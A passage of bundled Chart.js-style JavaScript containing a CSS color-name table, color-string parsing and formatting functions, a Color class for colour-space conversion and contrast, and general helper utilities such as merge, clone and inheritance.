    darkseagreen: [143, 188, 143],
    darkslateblue: [72, 61, 139],
    darkslategray: [47, 79, 79],
    darkslategrey: [47, 79, 79],
    darkturquoise: [0, 206, 209],
    darkviolet: [148, 0, 211],
    deeppink: [255, 20, 147],
    deepskyblue: [0, 191, 255],
    dimgray: [105, 105, 105],
    dimgrey: [105, 105, 105],
    dodgerblue: [30, 144, 255],
    firebrick: [178, 34, 34],
    floralwhite: [255, 250, 240],
    forestgreen: [34, 139, 34],
    fuchsia: [255, 0, 255],
    gainsboro: [220, 220, 220],
    ghostwhite: [248, 248, 255],
    gold: [255, 215, 0],
    goldenrod: [218, 165, 32],
    gray: [128, 128, 128],
    green: [0, 128, 0],
    greenyellow: [173, 255, 47],
    grey: [128, 128, 128],
    honeydew: [240, 255, 240],
    hotpink: [255, 105, 180],
    indianred: [205, 92, 92],
    indigo: [75, 0, 130],
    ivory: [255, 255, 240],
    khaki: [240, 230, 140],
    lavender: [230, 230, 250],
    lavenderblush: [255, 240, 245],
    lawngreen: [124, 252, 0],
    lemonchiffon: [255, 250, 205],
    lightblue: [173, 216, 230],
    lightcoral: [240, 128, 128],
    lightcyan: [224, 255, 255],
    lightgoldenrodyellow: [250, 250, 210],
    lightgray: [211, 211, 211],
    lightgreen: [144, 238, 144],
    lightgrey: [211, 211, 211],
    lightpink: [255, 182, 193],
    lightsalmon: [255, 160, 122],
    lightseagreen: [32, 178, 170],
    lightskyblue: [135, 206, 250],
    lightslategray: [119, 136, 153],
    lightslategrey: [119, 136, 153],
    lightsteelblue: [176, 196, 222],
    lightyellow: [255, 255, 224],
    lime: [0, 255, 0],
    limegreen: [50, 205, 50],
    linen: [250, 240, 230],
    magenta: [255, 0, 255],
    maroon: [128, 0, 0],
    mediumaquamarine: [102, 205, 170],
    mediumblue: [0, 0, 205],
    mediumorchid: [186, 85, 211],
    mediumpurple: [147, 112, 219],
    mediumseagreen: [60, 179, 113],
    mediumslateblue: [123, 104, 238],
    mediumspringgreen: [0, 250, 154],
    mediumturquoise: [72, 209, 204],
    mediumvioletred: [199, 21, 133],
    midnightblue: [25, 25, 112],
    mintcream: [245, 255, 250],
    mistyrose: [255, 228, 225],
    moccasin: [255, 228, 181],
    navajowhite: [255, 222, 173],
    navy: [0, 0, 128],
    oldlace: [253, 245, 230],
    olive: [128, 128, 0],
    olivedrab: [107, 142, 35],
    orange: [255, 165, 0],
    orangered: [255, 69, 0],
    orchid: [218, 112, 214],
    palegoldenrod: [238, 232, 170],
    palegreen: [152, 251, 152],
    paleturquoise: [175, 238, 238],
    palevioletred: [219, 112, 147],
    papayawhip: [255, 239, 213],
    peachpuff: [255, 218, 185],
    peru: [205, 133, 63],
    pink: [255, 192, 203],
    plum: [221, 160, 221],
    powderblue: [176, 224, 230],
    purple: [128, 0, 128],
    rebeccapurple: [102, 51, 153],
    red: [255, 0, 0],
    rosybrown: [188, 143, 143],
    royalblue: [65, 105, 225],
    saddlebrown: [139, 69, 19],
    salmon: [250, 128, 114],
    sandybrown: [244, 164, 96],
    seagreen: [46, 139, 87],
    seashell: [255, 245, 238],
    sienna: [160, 82, 45],
    silver: [192, 192, 192],
    skyblue: [135, 206, 235],
    slateblue: [106, 90, 205],
    slategray: [112, 128, 144],
    slategrey: [112, 128, 144],
    snow: [255, 250, 250],
    springgreen: [0, 255, 127],
    steelblue: [70, 130, 180],
    tan: [210, 180, 140],
    teal: [0, 128, 128],
    thistle: [216, 191, 216],
    tomato: [255, 99, 71],
    turquoise: [64, 224, 208],
    violet: [238, 130, 238],
    wheat: [245, 222, 179],
    white: [255, 255, 255],
    whitesmoke: [245, 245, 245],
    yellow: [255, 255, 0],
    yellowgreen: [154, 205, 50],
  };

  /* MIT license */

  var colorString = {
    getRgba: getRgba,
    getHsla: getHsla,
    getRgb: getRgb,
    getHsl: getHsl,
    getHwb: getHwb,
    getAlpha: getAlpha,

    hexString: hexString,
    rgbString: rgbString,
    rgbaString: rgbaString,
    percentString: percentString,
    percentaString: percentaString,
    hslString: hslString,
    hslaString: hslaString,
    hwbString: hwbString,
    keyword: keyword,
  };

  function getRgba(string) {
    if (!string) {
      return;
    }
    var abbr = /^#([a-fA-F0-9]{3,4})$/i,
      hex = /^#([a-fA-F0-9]{6}([a-fA-F0-9]{2})?)$/i,
      rgba =
        /^rgba?\(\s*([+-]?\d+)\s*,\s*([+-]?\d+)\s*,\s*([+-]?\d+)\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)$/i,
      per =
        /^rgba?\(\s*([+-]?[\d\.]+)\%\s*,\s*([+-]?[\d\.]+)\%\s*,\s*([+-]?[\d\.]+)\%\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)$/i,
      keyword = /(\w+)/;

    var rgb = [0, 0, 0],
      a = 1,
      match = string.match(abbr),
      hexAlpha = "";
    if (match) {
      match = match[1];
      hexAlpha = match[3];
      for (var i = 0; i < rgb.length; i++) {
        rgb[i] = parseInt(match[i] + match[i], 16);
      }
      if (hexAlpha) {
        a = Math.round((parseInt(hexAlpha + hexAlpha, 16) / 255) * 100) / 100;
      }
    } else if ((match = string.match(hex))) {
      hexAlpha = match[2];
      match = match[1];
      for (var i = 0; i < rgb.length; i++) {
        rgb[i] = parseInt(match.slice(i * 2, i * 2 + 2), 16);
      }
      if (hexAlpha) {
        a = Math.round((parseInt(hexAlpha, 16) / 255) * 100) / 100;
      }
    } else if ((match = string.match(rgba))) {
      for (var i = 0; i < rgb.length; i++) {
        rgb[i] = parseInt(match[i + 1]);
      }
      a = parseFloat(match[4]);
    } else if ((match = string.match(per))) {
      for (var i = 0; i < rgb.length; i++) {
        rgb[i] = Math.round(parseFloat(match[i + 1]) * 2.55);
      }
      a = parseFloat(match[4]);
    } else if ((match = string.match(keyword))) {
      if (match[1] == "transparent") {
        return [0, 0, 0, 0];
      }
      rgb = colorName$1[match[1]];
      if (!rgb) {
        return;
      }
    }

    for (var i = 0; i < rgb.length; i++) {
      rgb[i] = scale(rgb[i], 0, 255);
    }
    if (!a && a != 0) {
      a = 1;
    } else {
      a = scale(a, 0, 1);
    }
    rgb[3] = a;
    return rgb;
  }

  function getHsla(string) {
    if (!string) {
      return;
    }
    var hsl =
      /^hsla?\(\s*([+-]?\d+)(?:deg)?\s*,\s*([+-]?[\d\.]+)%\s*,\s*([+-]?[\d\.]+)%\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)/;
    var match = string.match(hsl);
    if (match) {
      var alpha = parseFloat(match[4]);
      var h = scale(parseInt(match[1]), 0, 360),
        s = scale(parseFloat(match[2]), 0, 100),
        l = scale(parseFloat(match[3]), 0, 100),
        a = scale(isNaN(alpha) ? 1 : alpha, 0, 1);
      return [h, s, l, a];
    }
  }

  function getHwb(string) {
    if (!string) {
      return;
    }
    var hwb =
      /^hwb\(\s*([+-]?\d+)(?:deg)?\s*,\s*([+-]?[\d\.]+)%\s*,\s*([+-]?[\d\.]+)%\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)/;
    var match = string.match(hwb);
    if (match) {
      var alpha = parseFloat(match[4]);
      var h = scale(parseInt(match[1]), 0, 360),
        w = scale(parseFloat(match[2]), 0, 100),
        b = scale(parseFloat(match[3]), 0, 100),
        a = scale(isNaN(alpha) ? 1 : alpha, 0, 1);
      return [h, w, b, a];
    }
  }

  function getRgb(string) {
    var rgba = getRgba(string);
    return rgba && rgba.slice(0, 3);
  }

  function getHsl(string) {
    var hsla = getHsla(string);
    return hsla && hsla.slice(0, 3);
  }

  function getAlpha(string) {
    var vals = getRgba(string);
    if (vals) {
      return vals[3];
    } else if ((vals = getHsla(string))) {
      return vals[3];
    } else if ((vals = getHwb(string))) {
      return vals[3];
    }
  }

  // generators
  function hexString(rgba, a) {
    var a = a !== undefined && rgba.length === 3 ? a : rgba[3];
    return (
      "#" +
      hexDouble(rgba[0]) +
      hexDouble(rgba[1]) +
      hexDouble(rgba[2]) +
      (a >= 0 && a < 1 ? hexDouble(Math.round(a * 255)) : "")
    );
  }

  function rgbString(rgba, alpha) {
    if (alpha < 1 || (rgba[3] && rgba[3] < 1)) {
      return rgbaString(rgba, alpha);
    }
    return "rgb(" + rgba[0] + ", " + rgba[1] + ", " + rgba[2] + ")";
  }

  function rgbaString(rgba, alpha) {
    if (alpha === undefined) {
      alpha = rgba[3] !== undefined ? rgba[3] : 1;
    }
    return (
      "rgba(" + rgba[0] + ", " + rgba[1] + ", " + rgba[2] + ", " + alpha + ")"
    );
  }

  function percentString(rgba, alpha) {
    if (alpha < 1 || (rgba[3] && rgba[3] < 1)) {
      return percentaString(rgba, alpha);
    }
    var r = Math.round((rgba[0] / 255) * 100),
      g = Math.round((rgba[1] / 255) * 100),
      b = Math.round((rgba[2] / 255) * 100);

    return "rgb(" + r + "%, " + g + "%, " + b + "%)";
  }

  function percentaString(rgba, alpha) {
    var r = Math.round((rgba[0] / 255) * 100),
      g = Math.round((rgba[1] / 255) * 100),
      b = Math.round((rgba[2] / 255) * 100);
    return (
      "rgba(" +
      r +
      "%, " +
      g +
      "%, " +
      b +
      "%, " +
      (alpha || rgba[3] || 1) +
      ")"
    );
  }

  function hslString(hsla, alpha) {
    if (alpha < 1 || (hsla[3] && hsla[3] < 1)) {
      return hslaString(hsla, alpha);
    }
    return "hsl(" + hsla[0] + ", " + hsla[1] + "%, " + hsla[2] + "%)";
  }

  function hslaString(hsla, alpha) {
    if (alpha === undefined) {
      alpha = hsla[3] !== undefined ? hsla[3] : 1;
    }
    return (
      "hsla(" + hsla[0] + ", " + hsla[1] + "%, " + hsla[2] + "%, " + alpha + ")"
    );
  }

  // hwb is a bit different than rgb(a) & hsl(a) since there is no alpha specific syntax
  // (hwb have alpha optional & 1 is default value)
  function hwbString(hwb, alpha) {
    if (alpha === undefined) {
      alpha = hwb[3] !== undefined ? hwb[3] : 1;
    }
    return (
      "hwb(" +
      hwb[0] +
      ", " +
      hwb[1] +
      "%, " +
      hwb[2] +
      "%" +
      (alpha !== undefined && alpha !== 1 ? ", " + alpha : "") +
      ")"
    );
  }

  function keyword(rgb) {
    return reverseNames[rgb.slice(0, 3)];
  }

  // helpers
  function scale(num, min, max) {
    return Math.min(Math.max(min, num), max);
  }

  function hexDouble(num) {
    var str = num.toString(16).toUpperCase();
    return str.length < 2 ? "0" + str : str;
  }

  //create a list of reverse color names
  var reverseNames = {};
  for (var name in colorName$1) {
    reverseNames[colorName$1[name]] = name;
  }

  /* MIT license */

  var Color = function (obj) {
    if (obj instanceof Color) {
      return obj;
    }
    if (!(this instanceof Color)) {
      return new Color(obj);
    }

    this.valid = false;
    this.values = {
      rgb: [0, 0, 0],
      hsl: [0, 0, 0],
      hsv: [0, 0, 0],
      hwb: [0, 0, 0],
      cmyk: [0, 0, 0, 0],
      alpha: 1,
    };

    // parse Color() argument
    var vals;
    if (typeof obj === "string") {
      vals = colorString.getRgba(obj);
      if (vals) {
        this.setValues("rgb", vals);
      } else if ((vals = colorString.getHsla(obj))) {
        this.setValues("hsl", vals);
      } else if ((vals = colorString.getHwb(obj))) {
        this.setValues("hwb", vals);
      }
    } else if (typeof obj === "object") {
      vals = obj;
      if (vals.r !== undefined || vals.red !== undefined) {
        this.setValues("rgb", vals);
      } else if (vals.l !== undefined || vals.lightness !== undefined) {
        this.setValues("hsl", vals);
      } else if (vals.v !== undefined || vals.value !== undefined) {
        this.setValues("hsv", vals);
      } else if (vals.w !== undefined || vals.whiteness !== undefined) {
        this.setValues("hwb", vals);
      } else if (vals.c !== undefined || vals.cyan !== undefined) {
        this.setValues("cmyk", vals);
      }
    }
  };

  Color.prototype = {
    isValid: function () {
      return this.valid;
    },
    rgb: function () {
      return this.setSpace("rgb", arguments);
    },
    hsl: function () {
      return this.setSpace("hsl", arguments);
    },
    hsv: function () {
      return this.setSpace("hsv", arguments);
    },
    hwb: function () {
      return this.setSpace("hwb", arguments);
    },
    cmyk: function () {
      return this.setSpace("cmyk", arguments);
    },

    rgbArray: function () {
      return this.values.rgb;
    },
    hslArray: function () {
      return this.values.hsl;
    },
    hsvArray: function () {
      return this.values.hsv;
    },
    hwbArray: function () {
      var values = this.values;
      if (values.alpha !== 1) {
        return values.hwb.concat([values.alpha]);
      }
      return values.hwb;
    },
    cmykArray: function () {
      return this.values.cmyk;
    },
    rgbaArray: function () {
      var values = this.values;
      return values.rgb.concat([values.alpha]);
    },
    hslaArray: function () {
      var values = this.values;
      return values.hsl.concat([values.alpha]);
    },
    alpha: function (val) {
      if (val === undefined) {
        return this.values.alpha;
      }
      this.setValues("alpha", val);
      return this;
    },

    red: function (val) {
      return this.setChannel("rgb", 0, val);
    },
    green: function (val) {
      return this.setChannel("rgb", 1, val);
    },
    blue: function (val) {
      return this.setChannel("rgb", 2, val);
    },
    hue: function (val) {
      if (val) {
        val %= 360;
        val = val < 0 ? 360 + val : val;
      }
      return this.setChannel("hsl", 0, val);
    },
    saturation: function (val) {
      return this.setChannel("hsl", 1, val);
    },
    lightness: function (val) {
      return this.setChannel("hsl", 2, val);
    },
    saturationv: function (val) {
      return this.setChannel("hsv", 1, val);
    },
    whiteness: function (val) {
      return this.setChannel("hwb", 1, val);
    },
    blackness: function (val) {
      return this.setChannel("hwb", 2, val);
    },
    value: function (val) {
      return this.setChannel("hsv", 2, val);
    },
    cyan: function (val) {
      return this.setChannel("cmyk", 0, val);
    },
    magenta: function (val) {
      return this.setChannel("cmyk", 1, val);
    },
    yellow: function (val) {
      return this.setChannel("cmyk", 2, val);
    },
    black: function (val) {
      return this.setChannel("cmyk", 3, val);
    },

    hexString: function () {
      return colorString.hexString(this.values.rgb);
    },
    rgbString: function () {
      return colorString.rgbString(this.values.rgb, this.values.alpha);
    },
    rgbaString: function () {
      return colorString.rgbaString(this.values.rgb, this.values.alpha);
    },
    percentString: function () {
      return colorString.percentString(this.values.rgb, this.values.alpha);
    },
    hslString: function () {
      return colorString.hslString(this.values.hsl, this.values.alpha);
    },
    hslaString: function () {
      return colorString.hslaString(this.values.hsl, this.values.alpha);
    },
    hwbString: function () {
      return colorString.hwbString(this.values.hwb, this.values.alpha);
    },
    keyword: function () {
      return colorString.keyword(this.values.rgb, this.values.alpha);
    },

    rgbNumber: function () {
      var rgb = this.values.rgb;
      return (rgb[0] << 16) | (rgb[1] << 8) | rgb[2];
    },

    luminosity: function () {
      // http://www.w3.org/TR/WCAG20/#relativeluminancedef
      var rgb = this.values.rgb;
      var lum = [];
      for (var i = 0; i < rgb.length; i++) {
        var chan = rgb[i] / 255;
        lum[i] =
          chan <= 0.03928
            ? chan / 12.92
            : Math.pow((chan + 0.055) / 1.055, 2.4);
      }
      return 0.2126 * lum[0] + 0.7152 * lum[1] + 0.0722 * lum[2];
    },

    contrast: function (color2) {
      // http://www.w3.org/TR/WCAG20/#contrast-ratiodef
      var lum1 = this.luminosity();
      var lum2 = color2.luminosity();
      if (lum1 > lum2) {
        return (lum1 + 0.05) / (lum2 + 0.05);
      }
      return (lum2 + 0.05) / (lum1 + 0.05);
    },

    level: function (color2) {
      var contrastRatio = this.contrast(color2);
      if (contrastRatio >= 7.1) {
        return "AAA";
      }

      return contrastRatio >= 4.5 ? "AA" : "";
    },

    dark: function () {
      // YIQ equation from http://24ways.org/2010/calculating-color-contrast
      var rgb = this.values.rgb;
      var yiq = (rgb[0] * 299 + rgb[1] * 587 + rgb[2] * 114) / 1000;
      return yiq < 128;
    },

    light: function () {
      return !this.dark();
    },

    negate: function () {
      var rgb = [];
      for (var i = 0; i < 3; i++) {
        rgb[i] = 255 - this.values.rgb[i];
      }
      this.setValues("rgb", rgb);
      return this;
    },

    lighten: function (ratio) {
      var hsl = this.values.hsl;
      hsl[2] += hsl[2] * ratio;
      this.setValues("hsl", hsl);
      return this;
    },

    darken: function (ratio) {
      var hsl = this.values.hsl;
      hsl[2] -= hsl[2] * ratio;
      this.setValues("hsl", hsl);
      return this;
    },

    saturate: function (ratio) {
      var hsl = this.values.hsl;
      hsl[1] += hsl[1] * ratio;
      this.setValues("hsl", hsl);
      return this;
    },

    desaturate: function (ratio) {
      var hsl = this.values.hsl;
      hsl[1] -= hsl[1] * ratio;
      this.setValues("hsl", hsl);
      return this;
    },

    whiten: function (ratio) {
      var hwb = this.values.hwb;
      hwb[1] += hwb[1] * ratio;
      this.setValues("hwb", hwb);
      return this;
    },

    blacken: function (ratio) {
      var hwb = this.values.hwb;
      hwb[2] += hwb[2] * ratio;
      this.setValues("hwb", hwb);
      return this;
    },

    greyscale: function () {
      var rgb = this.values.rgb;
      // http://en.wikipedia.org/wiki/Grayscale#Converting_color_to_grayscale
      var val = rgb[0] * 0.3 + rgb[1] * 0.59 + rgb[2] * 0.11;
      this.setValues("rgb", [val, val, val]);
      return this;
    },

    clearer: function (ratio) {
      var alpha = this.values.alpha;
      this.setValues("alpha", alpha - alpha * ratio);
      return this;
    },

    opaquer: function (ratio) {
      var alpha = this.values.alpha;
      this.setValues("alpha", alpha + alpha * ratio);
      return this;
    },

    rotate: function (degrees) {
      var hsl = this.values.hsl;
      var hue = (hsl[0] + degrees) % 360;
      hsl[0] = hue < 0 ? 360 + hue : hue;
      this.setValues("hsl", hsl);
      return this;
    },

    /**
     * Ported from sass implementation in C
     * https://github.com/sass/libsass/blob/0e6b4a2850092356aa3ece07c6b249f0221caced/functions.cpp#L209
     */
    mix: function (mixinColor, weight) {
      var color1 = this;
      var color2 = mixinColor;
      var p = weight === undefined ? 0.5 : weight;

      var w = 2 * p - 1;
      var a = color1.alpha() - color2.alpha();

      var w1 = ((w * a === -1 ? w : (w + a) / (1 + w * a)) + 1) / 2.0;
      var w2 = 1 - w1;

      return this.rgb(
        w1 * color1.red() + w2 * color2.red(),
        w1 * color1.green() + w2 * color2.green(),
        w1 * color1.blue() + w2 * color2.blue()
      ).alpha(color1.alpha() * p + color2.alpha() * (1 - p));
    },

    toJSON: function () {
      return this.rgb();
    },

    clone: function () {
      // NOTE(SB): using node-clone creates a dependency to Buffer when using browserify,
      // making the final build way to big to embed in Chart.js. So let's do it manually,
      // assuming that values to clone are 1 dimension arrays containing only numbers,
      // except 'alpha' which is a number.
      var result = new Color();
      var source = this.values;
      var target = result.values;
      var value, type;

      for (var prop in source) {
        if (source.hasOwnProperty(prop)) {
          value = source[prop];
          type = {}.toString.call(value);
          if (type === "[object Array]") {
            target[prop] = value.slice(0);
          } else if (type === "[object Number]") {
            target[prop] = value;
          } else {
            console.error("unexpected color value:", value);
          }
        }
      }

      return result;
    },
  };

  Color.prototype.spaces = {
    rgb: ["red", "green", "blue"],
    hsl: ["hue", "saturation", "lightness"],
    hsv: ["hue", "saturation", "value"],
    hwb: ["hue", "whiteness", "blackness"],
    cmyk: ["cyan", "magenta", "yellow", "black"],
  };

  Color.prototype.maxes = {
    rgb: [255, 255, 255],
    hsl: [360, 100, 100],
    hsv: [360, 100, 100],
    hwb: [360, 100, 100],
    cmyk: [100, 100, 100, 100],
  };

  Color.prototype.getValues = function (space) {
    var values = this.values;
    var vals = {};

    for (var i = 0; i < space.length; i++) {
      vals[space.charAt(i)] = values[space][i];
    }

    if (values.alpha !== 1) {
      vals.a = values.alpha;
    }

    // {r: 255, g: 255, b: 255, a: 0.4}
    return vals;
  };

  Color.prototype.setValues = function (space, vals) {
    var values = this.values;
    var spaces = this.spaces;
    var maxes = this.maxes;
    var alpha = 1;
    var i;

    this.valid = true;

    if (space === "alpha") {
      alpha = vals;
    } else if (vals.length) {
      // [10, 10, 10]
      values[space] = vals.slice(0, space.length);
      alpha = vals[space.length];
    } else if (vals[space.charAt(0)] !== undefined) {
      // {r: 10, g: 10, b: 10}
      for (i = 0; i < space.length; i++) {
        values[space][i] = vals[space.charAt(i)];
      }

      alpha = vals.a;
    } else if (vals[spaces[space][0]] !== undefined) {
      // {red: 10, green: 10, blue: 10}
      var chans = spaces[space];

      for (i = 0; i < space.length; i++) {
        values[space][i] = vals[chans[i]];
      }

      alpha = vals.alpha;
    }

    values.alpha = Math.max(
      0,
      Math.min(1, alpha === undefined ? values.alpha : alpha)
    );

    if (space === "alpha") {
      return false;
    }

    var capped;

    // cap values of the space prior converting all values
    for (i = 0; i < space.length; i++) {
      capped = Math.max(0, Math.min(maxes[space][i], values[space][i]));
      values[space][i] = Math.round(capped);
    }

    // convert to all the other color spaces
    for (var sname in spaces) {
      if (sname !== space) {
        values[sname] = colorConvert[space][sname](values[space]);
      }
    }

    return true;
  };

  Color.prototype.setSpace = function (space, args) {
    var vals = args[0];

    if (vals === undefined) {
      // color.rgb()
      return this.getValues(space);
    }

    // color.rgb(10, 10, 10)
    if (typeof vals === "number") {
      vals = Array.prototype.slice.call(args);
    }

    this.setValues(space, vals);
    return this;
  };

  Color.prototype.setChannel = function (space, index, val) {
    var svalues = this.values[space];
    if (val === undefined) {
      // color.red()
      return svalues[index];
    } else if (val === svalues[index]) {
      // color.red(color.red())
      return this;
    }

    // color.red(100)
    svalues[index] = val;
    this.setValues(space, svalues);

    return this;
  };

  if (typeof window !== "undefined") {
    window.Color = Color;
  }

  var chartjsColor = Color;

  function isValidKey(key) {
    return ["__proto__", "prototype", "constructor"].indexOf(key) === -1;
  }

  /**
   * @namespace Chart.helpers
   */
  var helpers = {
    /**
     * An empty function that can be used, for example, for optional callback.
     */
    noop: function () {},

    /**
     * Returns a unique id, sequentially generated from a global variable.
     * @returns {number}
     * @function
     */
    uid: (function () {
      var id = 0;
      return function () {
        return id++;
      };
    })(),

    /**
     * Returns true if `value` is neither null nor undefined, else returns false.
     * @param {*} value - The value to test.
     * @returns {boolean}
     * @since 2.7.0
     */
    isNullOrUndef: function (value) {
      return value === null || typeof value === "undefined";
    },

    /**
     * Returns true if `value` is an array (including typed arrays), else returns false.
     * @param {*} value - The value to test.
     * @returns {boolean}
     * @function
     */
    isArray: function (value) {
      if (Array.isArray && Array.isArray(value)) {
        return true;
      }
      var type = Object.prototype.toString.call(value);
      if (type.substr(0, 7) === "[object" && type.substr(-6) === "Array]") {
        return true;
      }
      return false;
    },

    /**
     * Returns true if `value` is an object (excluding null), else returns false.
     * @param {*} value - The value to test.
     * @returns {boolean}
     * @since 2.7.0
     */
    isObject: function (value) {
      return (
        value !== null &&
        Object.prototype.toString.call(value) === "[object Object]"
      );
    },

    /**
     * Returns true if `value` is a finite number, else returns false
     * @param {*} value  - The value to test.
     * @returns {boolean}
     */
    isFinite: function (value) {
      return (
        (typeof value === "number" || value instanceof Number) &&
        isFinite(value)
      );
    },

    /**
     * Returns `value` if defined, else returns `defaultValue`.
     * @param {*} value - The value to return if defined.
     * @param {*} defaultValue - The value to return if `value` is undefined.
     * @returns {*}
     */
    valueOrDefault: function (value, defaultValue) {
      return typeof value === "undefined" ? defaultValue : value;
    },

    /**
     * Returns value at the given `index` in array if defined, else returns `defaultValue`.
     * @param {Array} value - The array to lookup for value at `index`.
     * @param {number} index - The index in `value` to lookup for value.
     * @param {*} defaultValue - The value to return if `value[index]` is undefined.
     * @returns {*}
     */
    valueAtIndexOrDefault: function (value, index, defaultValue) {
      return helpers.valueOrDefault(
        helpers.isArray(value) ? value[index] : value,
        defaultValue
      );
    },

    /**
     * Calls `fn` with the given `args` in the scope defined by `thisArg` and returns the
     * value returned by `fn`. If `fn` is not a function, this method returns undefined.
     * @param {function} fn - The function to call.
     * @param {Array|undefined|null} args - The arguments with which `fn` should be called.
     * @param {object} [thisArg] - The value of `this` provided for the call to `fn`.
     * @returns {*}
     */
    callback: function (fn, args, thisArg) {
      if (fn && typeof fn.call === "function") {
        return fn.apply(thisArg, args);
      }
    },

    /**
     * Note(SB) for performance sake, this method should only be used when loopable type
     * is unknown or in none intensive code (not called often and small loopable). Else
     * it's preferable to use a regular for() loop and save extra function calls.
     * @param {object|Array} loopable - The object or array to be iterated.
     * @param {function} fn - The function to call for each item.
     * @param {object} [thisArg] - The value of `this` provided for the call to `fn`.
     * @param {boolean} [reverse] - If true, iterates backward on the loopable.
     */
    each: function (loopable, fn, thisArg, reverse) {
      var i, len, keys;
      if (helpers.isArray(loopable)) {
        len = loopable.length;
        if (reverse) {
          for (i = len - 1; i >= 0; i--) {
            fn.call(thisArg, loopable[i], i);
          }
        } else {
          for (i = 0; i < len; i++) {
            fn.call(thisArg, loopable[i], i);
          }
        }
      } else if (helpers.isObject(loopable)) {
        keys = Object.keys(loopable);
        len = keys.length;
        for (i = 0; i < len; i++) {
          fn.call(thisArg, loopable[keys[i]], keys[i]);
        }
      }
    },

    /**
     * Returns true if the `a0` and `a1` arrays have the same content, else returns false.
     * @see https://stackoverflow.com/a/14853974
     * @param {Array} a0 - The array to compare
     * @param {Array} a1 - The array to compare
     * @returns {boolean}
     */
    arrayEquals: function (a0, a1) {
      var i, ilen, v0, v1;

      if (!a0 || !a1 || a0.length !== a1.length) {
        return false;
      }

      for (i = 0, ilen = a0.length; i < ilen; ++i) {
        v0 = a0[i];
        v1 = a1[i];

        if (v0 instanceof Array && v1 instanceof Array) {
          if (!helpers.arrayEquals(v0, v1)) {
            return false;
          }
        } else if (v0 !== v1) {
          // NOTE: two different object instances will never be equal: {x:20} != {x:20}
          return false;
        }
      }

      return true;
    },

    /**
     * Returns a deep copy of `source` without keeping references on objects and arrays.
     * @param {*} source - The value to clone.
     * @returns {*}
     */
    clone: function (source) {
      if (helpers.isArray(source)) {
        return source.map(helpers.clone);
      }

      if (helpers.isObject(source)) {
        var target = Object.create(source);
        var keys = Object.keys(source);
        var klen = keys.length;
        var k = 0;

        for (; k < klen; ++k) {
          target[keys[k]] = helpers.clone(source[keys[k]]);
        }

        return target;
      }

      return source;
    },

    /**
     * The default merger when Chart.helpers.merge is called without merger option.
     * Note(SB): also used by mergeConfig and mergeScaleConfig as fallback.
     * @private
     */
    _merger: function (key, target, source, options) {
      if (!isValidKey(key)) {
        // We want to ensure we do not copy prototypes over
        // as this can pollute global namespaces
        return;
      }

      var tval = target[key];
      var sval = source[key];

      if (helpers.isObject(tval) && helpers.isObject(sval)) {
        helpers.merge(tval, sval, options);
      } else {
        target[key] = helpers.clone(sval);
      }
    },

    /**
     * Merges source[key] in target[key] only if target[key] is undefined.
     * @private
     */
    _mergerIf: function (key, target, source) {
      if (!isValidKey(key)) {
        // We want to ensure we do not copy prototypes over
        // as this can pollute global namespaces
        return;
      }

      var tval = target[key];
      var sval = source[key];

      if (helpers.isObject(tval) && helpers.isObject(sval)) {
        helpers.mergeIf(tval, sval);
      } else if (!target.hasOwnProperty(key)) {
        target[key] = helpers.clone(sval);
      }
    },

    /**
     * Recursively deep copies `source` properties into `target` with the given `options`.
     * IMPORTANT: `target` is not cloned and will be updated with `source` properties.
     * @param {object} target - The target object in which all sources are merged into.
     * @param {object|object[]} source - Object(s) to merge into `target`.
     * @param {object} [options] - Merging options:
     * @param {function} [options.merger] - The merge method (key, target, source, options)
     * @returns {object} The `target` object.
     */
    merge: function (target, source, options) {
      var sources = helpers.isArray(source) ? source : [source];
      var ilen = sources.length;
      var merge, i, keys, klen, k;

      if (!helpers.isObject(target)) {
        return target;
      }

      options = options || {};
      merge = options.merger || helpers._merger;

      for (i = 0; i < ilen; ++i) {
        source = sources[i];
        if (!helpers.isObject(source)) {
          continue;
        }

        keys = Object.keys(source);
        for (k = 0, klen = keys.length; k < klen; ++k) {
          merge(keys[k], target, source, options);
        }
      }

      return target;
    },

    /**
     * Recursively deep copies `source` properties into `target` *only* if not defined in target.
     * IMPORTANT: `target` is not cloned and will be updated with `source` properties.
     * @param {object} target - The target object in which all sources are merged into.
     * @param {object|object[]} source - Object(s) to merge into `target`.
     * @returns {object} The `target` object.
     */
    mergeIf: function (target, source) {
      return helpers.merge(target, source, { merger: helpers._mergerIf });
    },

    /**
     * Applies the contents of two or more objects together into the first object.
     * @param {object} target - The target object in which all objects are merged into.
     * @param {object} arg1 - Object containing additional properties to merge in target.
     * @param {object} argN - Additional objects containing properties to merge in target.
     * @returns {object} The `target` object.
     */
    extend:
      Object.assign ||
      function (target) {
        return helpers.merge(target, [].slice.call(arguments, 1), {
          merger: function (key, dst, src) {
            dst[key] = src[key];
          },
        });
      },

    /**
     * Basic javascript inheritance based on the model created in Backbone.js
     */
    inherits: function (extensions) {
      var me = this;
      var ChartElement =
        extensions && extensions.hasOwnProperty("constructor")
          ? extensions.constructor
          : function () {
              return me.apply(this, arguments);
            };

      var Surrogate = function () {
        this.constructor = ChartElement;
      };

      Surrogate.prototype = me.prototype;
      ChartElement.prototype = new Surrogate();
      ChartElement.extend = helpers.inherits;

      if (extensions) {
        helpers.extend(ChartElement.prototype, extensions);
      }

      ChartElement.__super__ = me.prototype;
      return ChartElement;
    },

    _deprecated: function (scope, value, previous, current) {
      if (value !== undefined) {
        console.warn(
          scope +
            ': "' +
            previous +
            '" is deprecated. Please use "' +
            current +
            '" instead'
        );
      }
    },
  };

  var helpers_core = helpers;

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use Chart.helpers.callback instead.
   * @function Chart.helpers.callCallback
   * @deprecated since version 2.6.0
   * @todo remove at version 3
   * @private
   */
  helpers.callCallback = helpers.callback;

  /**
   * Provided for backward compatibility, use Array.prototype.indexOf instead.
   * Array.prototype.indexOf compatibility: Chrome, Opera, Safari, FF1.5+, IE9+
   * @function Chart.helpers.indexOf
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers.indexOf = function (array, item, fromIndex) {
    return Array.prototype.indexOf.call(array, item, fromIndex);
  };

  /**
   * Provided for backward compatibility, use Chart.helpers.valueOrDefault instead.
   * @function Chart.helpers.getValueOrDefault
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers.getValueOrDefault = helpers.valueOrDefault;

  /**
   * Provided for backward compatibility, use Chart.helpers.valueAtIndexOrDefault instead.
   * @function Chart.helpers.getValueAtIndexOrDefault
   * @deprecated since version 2.7.0
